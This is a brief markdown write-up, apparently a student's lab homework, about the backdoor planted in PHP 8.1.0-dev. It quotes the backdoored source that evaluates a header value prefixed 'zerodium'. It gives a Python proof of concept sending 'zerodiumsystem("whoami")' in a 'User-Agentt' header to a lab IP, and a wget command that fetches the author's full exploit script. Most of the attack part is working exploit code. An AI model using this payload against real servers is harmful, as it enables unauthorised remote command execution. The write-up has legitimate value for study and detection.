# php 8.1.0-dev

* Remote Command Injection

**vuln code**

see [commits](https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d) in git hub.


```php
convert_to_string(enc);
		if (strstr(Z_STRVAL_P(enc), "zerodium")) {
			zend_try {
				zend_eval_string(Z_STRVAL_P(enc)+8, NULL, "REMOVETHIS: sold to zerodium, mid 2017");
```

More [Info](https://news-web.php.net/php.internals/113838)


**Poc in python**

```python

>>> # Example In python3

>>> from requests import get as _get

>>> res = _get("http://10.10.32.23/index.php", headers={
    "User-Agentt":'zerodiumsystem("whoami")'
})

>>> print(res.text.split("<!DOCTYPE html>")[0])

```


[Raw](https://raw.githubusercontent.com/Madhava-mng/my-cyber-diary/master/docs/pocs/exploit-php-8.1.0-dev.py) python script use curl or wget utils.

```sh
wget https://raw.githubusercontent.com/Madhava-mng/my-cyber-diary/master/docs/pocs/exploit-php-8.1.0-dev.py
```








* It just a home work for me.
